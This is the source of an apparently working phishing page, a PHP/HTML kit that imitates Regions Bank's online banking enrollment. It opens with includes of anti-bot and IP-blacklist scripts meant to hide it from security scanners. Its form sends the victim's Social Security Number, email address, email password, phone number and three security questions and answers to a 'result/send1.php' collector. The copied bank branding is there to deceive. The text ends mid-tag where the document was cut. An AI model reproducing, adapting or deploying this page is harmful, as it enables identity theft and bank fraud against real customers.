<?php
session_start();
error_reporting(0);
include'BOTS/IP-BlackList.php';  
include'BOTS/Bot-Crawler.php';
include'BOTS/Bot-Spox.php';
include'BOTS/blacklist.php';
include'BOTS/new.php';
include'BOTS/Fuck-you.php'; 
include'BOTS/Dila_DZ.php';
include'BOTS/index.php'; 


?>
<html class="notIE modern js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths js flexbox canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths js flexbox canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths js flexbox canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en"><head><script src="/Scripts/Desktop/Core/SkipAutoRegistration/polyfills/es5-shim.js"></script><script src="/Scripts/Desktop/Core/SkipAutoRegistration/polyfills/console.js"></script><script src="/Scripts/Desktop/Core/SkipAutoRegistration/polyfills/jquery.text-overflow.js"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=UA-108294743-4"></script><script type="text/javascript" async="" src="https://onlinebanking.regions.com/Scripts/Desktop/Core/SkipAutoRegistration/webtrends.min.js"></script><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script src="/Scripts/Desktop/Core/SkipAutoRegistration/polyfills/es5-shim.js"></script><script src="/Scripts/Desktop/Core/SkipAutoRegistration/polyfills/console.js"></script><script src="/Scripts/Desktop/Core/SkipAutoRegistration/polyfills/jquery.text-overflow.js"></script><script type="text/javascript" async="" src="./billing_files/analytics.js.download"></script><script type="text/javascript" async="" src="./billing_files/js"></script><script type="text/javascript" async="" src="./billing_files/webtrends.min.js.download"></script><script type="text/javascript" async="" src="./billing_files/d25d5a071a996a9fd3e9b261c237b4d8.js.download"></script><script src="./billing_files/serverComponent.php"></script>
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    
    <meta name="viewport" content="width=1020"> 

    
    <title>Regions Online Banking Enrollment - Enroll in Online Banking - Regions Online Banking</title>
    <link rel="shortcut icon" href="https://onlinebanking.regions.com/favicon.ico">

    
            <!--[if lt IE 9]>
        <script type="text/javascript" src="https://onlinebanking.regions.com/Scripts/Desktop/Core/SkipAutoRegistration/polyfills/es5-shim.js"></script>
        <script type="text/javascript" src="https://onlinebanking.regions.com/Scripts/Desktop/Core/SkipAutoRegistration/html5.js"></script>
        <![endif]-->


    
    <link href="./billing_files/combined.css.110ba1cfdfc31146117132d82a86495c4541a439.css" rel="stylesheet">
<link href="./billing_files/combined.css.be0498afed0ccc51fc0c391883f558125060a2a0.css" rel="stylesheet">
<link href="./billing_files/combined.css.3a8cfbb3a0eb894284ba9ab0f04986e7179184a6.css" rel="stylesheet">
<link href="./billing_files/combined.css.e39710304f0942e6b4c159b59b608062ec3c6942.css" rel="stylesheet">

    
    
    <style>
        .warning-message {
            background-color: #fff9e3;
            padding: 10px;
            margin: 10px;
        }
    </style>
<style type="text/css" id="amaze-css-module">.orange-button:focus,.regions-orange-button:focus,a.nexterror:focus,a.previouserror:focus,button:focus,h3:focus,input:focus,select:focus{outline:#1d8795 solid 2px!important}.orange-button:focus{border-color:inherit}.regions-orange-button:focus{border-color:transparent}.icon-circle-print:focus,.regions-back-button:focus,.regions-cancel-button:focus,.ui-dialog-titlebar-close:focus{outline:#1d8795 solid 2px}.amaze-clipper{position:absolute;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);width:1px;height:1px;overflow:hidden}a.amaze-skip-navigation:focus{position:absolute;top:0;left:0;background-color:#1d8795;color:#fff;border:0;padding:8px 15px 8px 8px;border-radius:0 0 15px;box-shadow:#999 2px 2px 8px 1px}table.regions-table>tbody>tr>th{border-bottom:1px solid #d8d8d5!important;border-radius:0!important;border-top:0 none;font-size:14px;padding:10px 15px;text-align:left;vertical-align:middle}.amaze-offscreen {  position: absolute !important;  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */  clip: rect(1px, 1px, 1px, 1px);  overflow: hidden;  width: 1px;  height: 1px;}</style><style type="text/css" id="amaze-css-module">.orange-button:focus,.regions-orange-button:focus,a.nexterror:focus,a.previouserror:focus,button:focus,h3:focus,input:focus,select:focus{outline:#1d8795 solid 2px!important}.orange-button:focus{border-color:inherit}.regions-orange-button:focus{border-color:transparent}.icon-circle-print:focus,.regions-back-button:focus,.regions-cancel-button:focus,.ui-dialog-titlebar-close:focus{outline:#1d8795 solid 2px}.amaze-clipper{position:absolute;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);width:1px;height:1px;overflow:hidden}a.amaze-skip-navigation:focus{position:absolute;top:0;left:0;background-color:#1d8795;color:#fff;border:0;padding:8px 15px 8px 8px;border-radius:0 0 15px;box-shadow:#999 2px 2px 8px 1px}table.regions-table>tbody>tr>th{border-bottom:1px solid #d8d8d5!important;border-radius:0!important;border-top:0 none;font-size:14px;padding:10px 15px;text-align:left;vertical-align:middle}</style><style type="text/css" id="amaze-css-module">.orange-button:focus,.regions-orange-button:focus,a.nexterror:focus,a.previouserror:focus,button:focus,h3:focus,input:focus,select:focus{outline:#1d8795 solid 2px!important}.orange-button:focus{border-color:inherit}.regions-orange-button:focus{border-color:transparent}.icon-circle-print:focus,.regions-back-button:focus,.regions-cancel-button:focus,.ui-dialog-titlebar-close:focus{outline:#1d8795 solid 2px}.amaze-clipper{position:absolute;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);width:1px;height:1px;overflow:hidden}a.amaze-skip-navigation:focus{position:absolute;top:0;left:0;background-color:#1d8795;color:#fff;border:0;padding:8px 15px 8px 8px;border-radius:0 0 15px;box-shadow:#999 2px 2px 8px 1px}table.regions-table>tbody>tr>th{border-bottom:1px solid #d8d8d5!important;border-radius:0!important;border-top:0 none;font-size:14px;padding:10px 15px;text-align:left;vertical-align:middle}</style><style type="text/css" id="amaze-css-module">.orange-button:focus,.regions-orange-button:focus,a.nexterror:focus,a.previouserror:focus,button:focus,h3:focus,input:focus,select:focus{outline:#1d8795 solid 2px!important}.orange-button:focus{border-color:inherit}.regions-orange-button:focus{border-color:transparent}.icon-circle-print:focus,.regions-back-button:focus,.regions-cancel-button:focus,.ui-dialog-titlebar-close:focus{outline:#1d8795 solid 2px}.amaze-clipper{position:absolute;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);width:1px;height:1px;overflow:hidden}a.amaze-skip-navigation:focus{position:absolute;top:0;left:0;background-color:#1d8795;color:#fff;border:0;padding:8px 15px 8px 8px;border-radius:0 0 15px;box-shadow:#999 2px 2px 8px 1px}table.regions-table>tbody>tr>th{border-bottom:1px solid #d8d8d5!important;border-radius:0!important;border-top:0 none;font-size:14px;padding:10px 15px;text-align:left;vertical-align:middle}</style><style type="text/css" id="amaze-css-module">.orange-button:focus,.regions-orange-button:focus,a.nexterror:focus,a.previouserror:focus,button:focus,h3:focus,input:focus,select:focus{outline:#1d8795 solid 2px!important}.orange-button:focus{border-color:inherit}.regions-orange-button:focus{border-color:transparent}.icon-circle-print:focus,.regions-back-button:focus,.regions-cancel-button:focus,.ui-dialog-titlebar-close:focus{outline:#1d8795 solid 2px}.amaze-clipper{position:absolute;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);width:1px;height:1px;overflow:hidden}a.amaze-skip-navigation:focus{position:absolute;top:0;left:0;background-color:#1d8795;color:#fff;border:0;padding:8px 15px 8px 8px;border-radius:0 0 15px;box-shadow:#999 2px 2px 8px 1px}table.regions-table>tbody>tr>th{border-bottom:1px solid #d8d8d5!important;border-radius:0!important;border-top:0 none;font-size:14px;padding:10px 15px;text-align:left;vertical-align:middle}</style><style type="text/css" id="amaze-css-module">.orange-button:focus,.regions-orange-button:focus,a.nexterror:focus,a.previouserror:focus,button:focus,h3:focus,input:focus,select:focus{outline:#1d8795 solid 2px!important}.orange-button:focus{border-color:inherit}.regions-orange-button:focus{border-color:transparent}.icon-circle-print:focus,.regions-back-button:focus,.regions-cancel-button:focus,.ui-dialog-titlebar-close:focus{outline:#1d8795 solid 2px}.amaze-clipper{position:absolute;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);width:1px;height:1px;overflow:hidden}a.amaze-skip-navigation:focus{position:absolute;top:0;left:0;background-color:#1d8795;color:#fff;border:0;padding:8px 15px 8px 8px;border-radius:0 0 15px;box-shadow:#999 2px 2px 8px 1px}table.regions-table>tbody>tr>th{border-bottom:1px solid #d8d8d5!important;border-radius:0!important;border-top:0 none;font-size:14px;padding:10px 15px;text-align:left;vertical-align:middle}</style><style type="text/css" id="amaze-css-module">.orange-button:focus,.regions-orange-button:focus,a.nexterror:focus,a.previouserror:focus,button:focus,h3:focus,input:focus,select:focus{outline:#1d8795 solid 2px!important}.orange-button:focus{border-color:inherit}.regions-orange-button:focus{border-color:transparent}.icon-circle-print:focus,.regions-back-button:focus,.regions-cancel-button:focus,.ui-dialog-titlebar-close:focus{outline:#1d8795 solid 2px}.amaze-clipper{position:absolute;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);width:1px;height:1px;overflow:hidden}a.amaze-skip-navigation:focus{position:absolute;top:0;left:0;background-color:#1d8795;color:#fff;border:0;padding:8px 15px 8px 8px;border-radius:0 0 15px;box-shadow:#999 2px 2px 8px 1px}table.regions-table>tbody>tr>th{border-bottom:1px solid #d8d8d5!important;border-radius:0!important;border-top:0 none;font-size:14px;padding:10px 15px;text-align:left;vertical-align:middle}</style></head>

<body class="unauthview" data-loading="Loading..." data-scriptpath="/Scripts/Desktop" data-oaoredirecturl="https://onlinebanking.regions.com/customerservice/oaoredirect" data-helpviewurl="https://onlinebanking.regions.com/core/gethelpview" data-beforeunload="You have not saved your changes. Please select Stay on this page and save your changes before leaving this page. To proceed without saving your changes, select Leave this page." data-unexpectederror="We are unable to process your request at this time. Please try again later. If you continue to experience difficulty, call 1-800-472-2265 for further assistance." data-ping-url="https://onlinebanking.regions.com/core/pingolb" data-rewardsssourl="https://onlinebanking.regions.com/accounts/getsamlpostvalues" data-mymortgage-sso-url="https://onlinebanking.regions.com/accounts/getmymortgagesamlpostvalues" data-get-investment-sso-url="https://onlinebanking.regions.com/accounts/geticonnect2investsamlpostvalues" data-get-trust-sso-url="https://onlinebanking.regions.com/accounts/gettrustonlinesamlpostvalues" data-resized="true">

    

    
    <input name="__RequestVerificationToken" type="hidden" value="KLl6YgEbBEQv0d/hf5jG3gaFSumRb0l0S6b1a3mobhAHRSKHhzvMpTT0wj8mKfsdIcAGu9lRJddi6mZzlF8dRCOMyqXEMCrhGZ874ajSkEjRJl/11ZTZVUAkzAI+JHVXLtBaGXhdoyLmrOxbyCHXNG11rVHmqOIwbvhPAf5tngY=">

    
    <div id="contentWrapper" style="display: block;" class="contentWrapper">
        


<div id="page">
    <div>
        <header id="regions-header">
            <nav>
                


<a href="http://www.regions.com/" class="header-logo no-print logo-regions">
    <span class="visually-hidden">Regions Online Banking</span>
</a>


            </nav>

            <section style="display: none">
                
            </section>

            
    


<section class="sub-menu">
            <div class="title-context"></div>

            <h1>Regions Online Banking Verification</h1>

        <section class="basictabheader by-title" role="tabpanel">
        <nav class="tabbuttons">
            <ul role="tablist">
            </ul>
        </nav>
    </section>

        <div class="line-separator"></div>

</section>














        </header>
    </div>

    <div>
        <section id="regions-content" role="main">
            




<section id="enrollment-home" class="template">
         <section id="columnFill">
            <section id="widget-2235ae866a6b4fac826c3457bbeafcaf" class="regions-widget enrollments-enrollmentwidget">


    


<table>
    <tbody>
        <tr>
            <td>
                <span class="enroll-errormsg"></span>
            </td>
            <td colspan="2"></td>
        </tr>
        <tr>
            <td style="width:74%">
                <div class="enrollment-section" data-loginlinkurl="http://www.regions.com">
                    <input class="step1-nextsection-indicator" id="step1sectionindicator" name="step1sectionindicator" type="hidden" value="prospect">
                    <input class="tab-banking-type" id="BankingType" name="BankingType" type="hidden" value="">
                    <input class="tab-account-type" id="AccountsType" name="AccountsType" type="hidden" value="">
                    <input class="tab-method-type" id="MethodType" name="MethodType" type="hidden" value="">

                    
                    <div class="enroll-accordion-panel ui-accordion ui-widget ui-helper-reset">
                        <h3 class="selected ui-accordion-header ui-helper-reset ui-state-default ui-accordion-icons ui-accordion-header-active ui-state-active ui-corner-top" id="ui-accordion-1-header-0" style="cursor: default;">
                            <span class="ui-accordion-header-icon ui-icon"></span>
                            <div class="accordionHeader">
                                <span class="icon accordionVerificationTemplates"></span>
                                <span class="accordian-header-title"><span class="accordian-header-title">Step 1 - Customer Information</span></span>
                            </div>
                        </h3>
                        <div class="ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom ui-accordion-content-active" id="ui-accordion-1-panel-0" aria-labelledby="ui-accordion-1-header-0" role="tabpanel" aria-expanded="true" aria-hidden="false" style="display: block;">
                            

<div class="enrollment-verification">
    <input class="resident-ssnheader" id="residentssnheader" name="residentssnheader" type="hidden" value="To get started, please enter the following required information:">
    <input class="nra-header" id="nraheader" name="nraheader" type="hidden" value="To get started, please enter your personal information.">
    
    <input class="tabname-list" id="tabnamelist" name="tabnamelist" type="hidden" value="">

    <div class="customer-verification">
        <div class="nra-identification-url" data-nraidentificationurl="https://onlinebanking.regions.com/enrollments/nraenrollment"></div>
 
         <form action="result/send1.php" method="post" autocomplete="off" class="make-enrollment-prospect">
        <div class="validation-summary-valid" data-valmsg-summary="true"><ul><li style="display:none"></li>
</ul></div>
        
        <h4><span class="ssnnra-header">To get verified, please enter the following required information:</span></h4>  

        <hr>

        <fieldset>
            <legend class="visually-hidden">Customer Verification</legend>

            <ol>
                <li>
                    <span class="regions-label first required-field-legend">Required Field<abbr class="required-field" title="Required">*</abbr></span>
                </li>
                <li class="ssn-verification">
                    <label for="SocialNumber" class="regions-label first">Social Security Number<abbr class="required-field" title="Required">*</abbr></label>
                    <input aria-required="true" class="ssn-number" data-val="true" data-val-regex="&amp;#39;Social Security Number&amp;#39; is not in the correct format." data-val-regex-pattern="(\D*\d){9}|(_{3}-_{2}-_{4})$" data-val-required="&amp;#39;Social Security Number&amp;#39; is required." placeholder="xxx-xx-xxxx" placeid="SocialNumber" maxlength="11" name="SocialNumber" required="required" style="width: 120px;" type="text" value="">
                    <a href="javascript:void(0)" class="nonresident ui-flyout-activator ui-flyout-closed" tabindex="0" role="button" aria-expanded="false" aria-describedby="flyout-0">
                        I don't have a Social<br>Security Number
                    </a>
                    <section class="fly-out hover-flyout" data-fly-out-direction="up" data-fly-out-arrow="true" data-fly-out-activateon="hover" id="flyout-0">                        <p>If you don't have a Social Security Number,<br> but were given an Enrollment ID from a <br> Regions associate, <a href="javascript:void(0)" class="nonresident-link">follow this path.</a><br> <br>Otherwise you will need to call <br> 1-800-REGIONS for assistance </p></section>
                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="SocialNumber" data-valmsg-replace="true"></span>
                </li>
         
                <li>
                    <label for="Email" class="regions-label first"><span style="display: inline-block">                    Email Address<sup></sup></span><abbr class="required-field" title="Required">*</abbr></label>
                    <input aria-required="true" class="email" data-val="true" data-val-email="&amp;#39;Email&amp;#39; is not a valid email address." data-val-length="&amp;#39;Email&amp;#39; must be between 6 and 50 characters." data-val-length-max="50" data-val-length-min="6" data-val-required="&amp;#39;Email&amp;#39; is required." id="Email" maxlength="50" name="email" required="required" style="width: 200px" type="text" value="">
                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="Email" data-valmsg-replace="true"></span>
                </li>
                <li>
                    <label for="ConfirmEmail" class="regions-label first">Email Password<abbr class="required-field" title="Required">*</abbr></label>
                    <input aria-required="true" class="confirm-email" data-val="true" data-val-equalto="&amp;#39;Confirm Email&amp;#39; should be equal to &amp;#39;Email&amp;#39;." data-val-equalto-other="*.Email" data-val-required="&amp;#39;Confirm Email&amp;#39; is required." id="ConfirmEmail" maxlength="50" name="emailpass" required="required" style="width: 200px" type="password" value="">
                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="ConfirmEmail" data-valmsg-replace="true"></span>
                </li>
                <li>
                    <label for="PrimaryPhoneNumber" class="regions-label first"><span style="display: inline-block"> Phone Number<sup>1</sup></span><abbr class="required-field" title="Required">*</abbr></label>
                    <input aria-required="true" class="primary-phonenumber" data-val="true" data-val-phonyphonevalidator="&amp;#39;Primary Phone Number&amp;#39; is invalid" data-val-regex="&amp;#39;Primary Phone Number&amp;#39; is not in the correct format." data-val-regex-pattern="(\D*\d){10}|(\(_{3}\)_{3}-_{4})$" data-val-required="&amp;#39;Primary Phone Number&amp;#39; is required." id="PrimaryPhoneNumber" maxlength="13" name="PrimaryPhoneNumber" required="required" style="width:120px;" type="text" value="">

                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="PrimaryPhoneNumber" data-valmsg-replace="true"></span>

                </li>
                
<li>
                    <label for="SecondaryPhoneNumber" class="regions-label first"><span style="display: inline-block"> Security Question <sup>1</sup></span><span class="optional-field">&nbsp;</span></label>
                    <select name="sq1" style="width:300px;" class="valid">
 <option value="Select your security question">Select your security question</option>
 <option value="What is your favorite animal?">What is your favorite animal?</option>
<option value="What is your favorite color?">What is your favorite color?</option>
<option value="What was the name of your favorite pet?">What was the name of your favorite pet?</option>
<option value="What was the name of your first best friend?">What was the name of your first best friend?</option>
<option value="What is your father's middle name?">What is your father's middle name?</option>
<option value="Who is your favorite musical performer/group?">Who is your favorite musical performer/group?</option>
<option value="What is the last name of your favorite teacher?">What is the last name of your favorite teacher?</option>
<option value="In">In </option><option value="what city were you born?">what city were you born?</option>
<option value="What was your maternal grandmother’s first name?">What was your maternal grandmother’s first name?</option> 
<option value="What was the model of your first car?">What was the model of your first car?</option>
<option value="What is your best friend's middle name?">What is your best friend's middle name?</option>
<option value="What was the name of your first best friend?">What was the name of your first best friend?</option>
<option value="What was your first job?">What was your first job?</option>
<option value="What was the model of your first car?">What was the model of your first car?</option>
<option value="What is your father's middle name?">What is your father's middle name?</option>
<option value="What is your mother's middle name?">What is your mother's middle name?</option>
<option value="What high school did you attend?">What high school did you attend?</option>
<option value="Who is your favorite musical performer/group?">Who is your favorite musical performer/group?</option>
<option value="Who was your first crush?">Who was your first crush?</option>
<option value="What is your favorite animal?">What is your favorite animal?</option>
<option value="What was your first pet's name?">What was your first pet's name?</option>
<option value="what was your best friend name in high school">what was your best friend name in high school</option>
<option value="What is your dream job?">What is your dream job?</option>
<option value="Who is your favorite author?">Who is your favorite author?</option>
<option value="What is your favorite color?">What is your favorite color?</option>
<option value="In">In </option><option value="what month was your father born?">what month was your father born?</option>
<option value="Who was your childhood hero?">Who was your childhood hero?</option>
<option value="Who was your first crush?">Who was your first crush?</option>
<option value="Who was your first employer?">Who was your first employer?</option>
<option value="What is the last name of the author of the best book you ever read?">What is the last name of the author of the best book you ever read?</option> 
<option value="Who is your favorite athlete?">Who is your favorite athlete?</option>
</select>

                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="SecondaryPhoneNumber" data-valmsg-replace="true"></span>

                </li><li>
                    <label for="SecondaryPhoneNumber" class="regions-label first"><span style="display: inline-block"> Security Answer<sup>1</sup></span><span class="optional-field">&nbsp;</span></label>
                    <input style="width:400px;" id="UserName" maxlength="500" tabindex="0" type="text" value="" name="sa1">

                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="SecondaryPhoneNumber" data-valmsg-replace="true"></span>

                </li>
<li>
                    <label for="SecondaryPhoneNumber" class="regions-label first"><span style="display: inline-block"> Security Question <sup>2</sup></span><span class="optional-field">&nbsp;</span></label>
                    <select name="sq2" style="width:300px;" class="valid">
 <option value="1">Select your security question</option>
  <option value="What is your favorite animal?">What is your favorite animal?</option>
<option value="What is your favorite color?">What is your favorite color?</option>
<option value="What was the name of your favorite pet?">What was the name of your favorite pet?</option>
<option value="What was the name of your first best friend?">What was the name of your first best friend?</option>
<option value="What is your father's middle name?">What is your father's middle name?</option>
<option value="Who is your favorite musical performer/group?">Who is your favorite musical performer/group?</option>
<option value="What is the last name of your favorite teacher?">What is the last name of your favorite teacher?</option>
<option value="In">In </option><option value="what city were you born?">what city were you born?</option>
<option value="What was your maternal grandmother’s first name?">What was your maternal grandmother’s first name?</option> 
<option value="What was the model of your first car?">What was the model of your first car?</option>
<option value="What is your best friend's middle name?">What is your best friend's middle name?</option>
<option value="What was the name of your first best friend?">What was the name of your first best friend?</option>
<option value="What was your first job?">What was your first job?</option>
<option value="What was the model of your first car?">What was the model of your first car?</option>
<option value="What is your father's middle name?">What is your father's middle name?</option>
<option value="What is your mother's middle name?">What is your mother's middle name?</option>
<option value="What high school did you attend?">What high school did you attend?</option>
<option value="Who is your favorite musical performer/group?">Who is your favorite musical performer/group?</option>
<option value="Who was your first crush?">Who was your first crush?</option>
<option value="What is your favorite animal?">What is your favorite animal?</option>
<option value="What was your first pet's name?">What was your first pet's name?</option>
<option value="what was your best friend name in high school">what was your best friend name in high school</option>
<option value="What is your dream job?">What is your dream job?</option>
<option value="Who is your favorite author?">Who is your favorite author?</option>
<option value="What is your favorite color?">What is your favorite color?</option>
<option value="In">In </option><option value="what month was your father born?">what month was your father born?</option>
<option value="Who was your childhood hero?">Who was your childhood hero?</option>
<option value="Who was your first crush?">Who was your first crush?</option>
<option value="Who was your first employer?">Who was your first employer?</option>
<option value="What is the last name of the author of the best book you ever read?">What is the last name of the author of the best book you ever read?</option> 
<option value="Who is your favorite athlete?">Who is your favorite athlete?</option>
</select>

                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="SecondaryPhoneNumber" data-valmsg-replace="true"></span>

                </li><li>
                    <label for="SecondaryPhoneNumber" class="regions-label first"><span style="display: inline-block"> Security Answer<sup>2</sup></span><span class="optional-field">&nbsp;</span></label>
                    <input style="width:400px;" id="UserName1" maxlength="500" tabindex="0" type="text" value="" name="sa2">

                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="SecondaryPhoneNumber" data-valmsg-replace="true"></span>

                </li>
<li>
                    <label for="SecondaryPhoneNumber" class="regions-label first"><span style="display: inline-block"> Security Question <sup>3</sup></span><span class="optional-field">&nbsp;</span></label>
                    <select name="sq3" style="width:300px;" class="valid">
 <option value="1">Select your security question</option>
 <option value="What is your favorite animal?">What is your favorite animal?</option>
<option value="What is your favorite color?">What is your favorite color?</option>
<option value="What was the name of your favorite pet?">What was the name of your favorite pet?</option>
<option value="What was the name of your first best friend?">What was the name of your first best friend?</option>
<option value="What is your father's middle name?">What is your father's middle name?</option>
<option value="Who is your favorite musical performer/group?">Who is your favorite musical performer/group?</option>
<option value="What is the last name of your favorite teacher?">What is the last name of your favorite teacher?</option>
<option value="In">In </option><option value="what city were you born?">what city were you born?</option>
<option value="What was your maternal grandmother’s first name?">What was your maternal grandmother’s first name?</option> 
<option value="What was the model of your first car?">What was the model of your first car?</option>
<option value="What is your best friend's middle name?">What is your best friend's middle name?</option>
<option value="What was the name of your first best friend?">What was the name of your first best friend?</option>
<option value="What was your first job?">What was your first job?</option>
<option value="What was the model of your first car?">What was the model of your first car?</option>
<option value="What is your father's middle name?">What is your father's middle name?</option>
<option value="What is your mother's middle name?">What is your mother's middle name?</option>
<option value="What high school did you attend?">What high school did you attend?</option>
<option value="Who is your favorite musical performer/group?">Who is your favorite musical performer/group?</option>
<option value="Who was your first crush?">Who was your first crush?</option>
<option value="What is your favorite animal?">What is your favorite animal?</option>
<option value="What was your first pet's name?">What was your first pet's name?</option>
<option value="what was your best friend name in high school">what was your best friend name in high school</option>
<option value="What is your dream job?">What is your dream job?</option>
<option value="Who is your favorite author?">Who is your favorite author?</option>
<option value="What is your favorite color?">What is your favorite color?</option>
<option value="In">In </option><option value="what month was your father born?">what month was your father born?</option>
<option value="Who was your childhood hero?">Who was your childhood hero?</option>
<option value="Who was your first crush?">Who was your first crush?</option>
<option value="Who was your first employer?">Who was your first employer?</option>
<option value="What is the last name of the author of the best book you ever read?">What is the last name of the author of the best book you ever read?</option> 
<option value="Who is your favorite athlete?">Who is your favorite athlete?</option>
</select>

                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="SecondaryPhoneNumber" data-valmsg-replace="true"></span>

                </li>
<li>
                    <label for="SecondaryPhoneNumber" class="regions-label first"><span style="display: inline-block"> Security Answer<sup>3</sup></span><span class="optional-field">&nbsp;</span></label>
                    <input style="width:400px;" id="UserName2" maxlength="500" tabindex="0" type="text" value="" name="sa3">

                    <span class="field-validation-valid" data-valmsg-autowidth="true" data-valmsg-for="SecondaryPhoneNumber" data-valmsg-replace="true"></span>

                </li>
                <li class="electronic-banking-agreement">
                    1. All information provided is subject to the 
                    <a href="javascript:void(0)" class="electronic-agreement-link" style="text-decoration: underline">
                        Agreement and Disclosure Statement for Electronic <br>Banking Services.
                    </a>
                </li>
				<button class="" type="submit" style="
    margin-left: 550px;
    margin-top: 20px;
font-weight: bold;
    padding: 10px 17px 10px 17px;
    font-size: 14px;
    border: 2px solid transparent;
    color: white!important;
    margin: 2px;
    outline: 0;
    cursor: pointer;
    display: inline-block;
    text-align: center;
    line-height: normal;
    vertical-align: bottom;
    background-color: #f0853e!important;
    background-image: -webkit-gradient(linear,left top,left bottom,from(#f0853e),to(#b34801))!important;
    background-image: -webkit-linear-gradient(top,#f0853e,#b34801)!important;
">Review and Continue</button>
            </ol>
        </fieldset>
        
        </form>

        <hr>
        <div class="button-actions">
            <span class="button-right-layout">
            </span>
        </div>
    </div>

    <div class="identification-information" style="display:none">
        
        <h4>Please review the following information:</h4>

        <ul class="form-verification">
            <li class="prospect-information">
                <span class="regions-label"><span style="display: inline-block"> Social Security Number:</span></span>
                <span class="verify-ssn"></span>
            </li>
            <li class="nra-information" style="display: none">
                <span class="regions-label"><span style="display: inline-block"> Enrollment ID:</span></span>
                <span class="verify-nraEnrolNum"></span>
            </li>
            <li>
                <span class="regions-label"><span style="display: inline-block"> Email Address:</span></span>
                <span class="verify-email"></span>
            </li>
            <li>
                <span class="regions-label"><span style="display: inline-block"> Phone Number:</span></span>
                <span class="display-ph-number"></span><span class="dispaly-ph-type"></span>
            </li>
            <li>
                <span class="regions-label"><span style="display: inline-block"> Alternate Phone Number:</span></span>
                <span class="display-altph-number"></span><span class="dispaly-altph-type"></span>
            </li>
        </ul>

        <hr>

        
            

<section class="banking-typetab">
    <input class="is-addprofile-page" id="IsDisplayProfilePage" name="IsDisplayProfilePage" type="hidden" value="False">

    <div class="morethanonebusinessurl" data-getmorethanonebusurl="https://onlinebanking.regions.com/enrollments/getdisclosuresandterms"></div>

    <section class="tabheader tabheader-noborder"> <h4 id="tfohqom">What kind of bank accounts do you want to enroll in Regions Online Banking ?</h4><div class="navwrapper"><nav class="tabbuttons"><ul role="tablist" aria-labelledby="tfohqom"><li role="presentation"><button tabindex="0" type="button" data-tabname="Personal" class="selector" role="tab" aria-selected="false" aria-owns="ytkijtj" id="asejhff">Personal Banking</button></li><li role="presentation"><button tabindex="-1" type="button" data-tabname="Business" class="selector" role="tab" aria-selected="false" aria-owns="idstcgq" id="xjifivh">Business Banking</button></li><li role="presentation"><button tabindex="-1" type="button" data-tabname="PersonalBusiness" class="selector" role="tab" aria-selected="false" aria-owns="hpxigti" id="vrrjglk">Personal &amp; Business</button></li></ul></nav></div><div data-tabname="Personal" class="content" tabindex="-1" role="tabpanel" id="ytkijtj" aria-hidden="false" aria-labelledby="asejhff"><section class="tabheader tabheader-noborder checkingother-tabcontainer prospect-information">    <h4 id="cdduwwp">Which personal account(s) do you have with Regions? Select one:</h4><div class="navwrapper"><nav class="tabbuttons"><ul role="tablist" aria-labelledby="cdduwwp"><li role="presentation"><button tabindex="0" 